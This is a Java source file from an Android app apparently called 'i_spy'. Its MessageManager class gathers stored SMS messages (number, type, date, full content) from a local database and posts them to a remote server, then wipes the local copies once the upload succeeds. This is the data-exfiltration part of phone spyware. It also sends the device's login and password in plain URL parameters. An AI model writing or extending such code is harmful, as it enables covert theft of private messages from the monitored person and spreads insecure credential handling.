package com.um.asn.i_spy.managers;


import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.um.asn.i_spy.Config;
import com.um.asn.i_spy.database_helper.DatabaseHelper;
import com.um.asn.i_spy.http_methods.HttpPostTask;
import com.um.asn.i_spy.models.Message;
import com.um.asn.i_spy.models.Phone;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.concurrent.ExecutionException;

public class MessageManager {

    public Context context;
    public ConnectivityManager cm;
    public Phone phone;
    public ArrayList<Message> messages;

    public MessageManager(Context context, Phone phone) {
        this.context = context;
        this.phone = phone;
        this.cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.messages = new ArrayList<Message>();
    }

    public void run() {
        insertDistFromLocal();
    }

    public void setMessages(ArrayList<Message> messages) {
        this.messages = messages;
    }

    public boolean insert() {
        NetworkInfo networkInfo = this.cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            JSONArray jaM = new JSONArray();

            for (Message msg : this.messages) {
                JSONObject jo = new JSONObject();
                try {
                    jo.put("numero", msg.getNumero());
                    jo.put("type", msg.getType());
                    jo.put("dateMessage", msg.getDate());
                    jo.put("contenu", msg.getContenu());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jaM.put(jo);
            }

            try {
                String url = Config.SERVER_DOMAIN + "messages";
                url += "?phone[login]=" + phone.getLogin() + "&phone[password]=" + phone.getPassword();
                JSONObject result = new JSONObject((String) new HttpPostTask().execute(new Object[]{url, jaM.toString()}).get());

                if ((boolean) result.get("success")) {
                    System.out.println("Message saved dist");
                    return true;
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    public void insertLocal() {
        DatabaseHelper myBD = new DatabaseHelper(this.context);
        myBD.insertMessage(this.messages.get(0));
        System.out.println("Message saved local (" + myBD.getAllMessage().size() + ")");
    }

    public void insertDistFromLocal() {
        DatabaseHelper myBD = new DatabaseHelper(this.context);
        this.messages = myBD.getAllMessage();
        System.out.println("getAll size : " + this.messages.size());

        if (insert())
            myBD.deleteAllMessage();
    }

}
